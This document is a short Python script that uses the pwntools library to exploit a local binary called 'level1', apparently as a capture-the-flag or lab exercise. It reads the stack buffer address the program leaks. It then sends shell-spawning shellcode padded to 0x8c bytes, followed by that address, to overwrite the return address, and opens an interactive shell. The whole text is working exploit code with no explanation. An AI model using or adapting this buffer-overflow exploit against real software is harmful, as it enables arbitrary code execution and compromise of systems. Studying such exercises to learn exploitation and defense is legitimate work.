from pwn import *
sh = process("./level1")

shellcode = asm(shellcraft.sh())

sh.recvuntil('this:')
buf_addr = int(sh.recvuntil('?\n',  drop = True), 16)

payload = flat(shellcode.ljust(0x8c, b'a'), buf_addr)

sh.sendline(payload)
sh.interactive()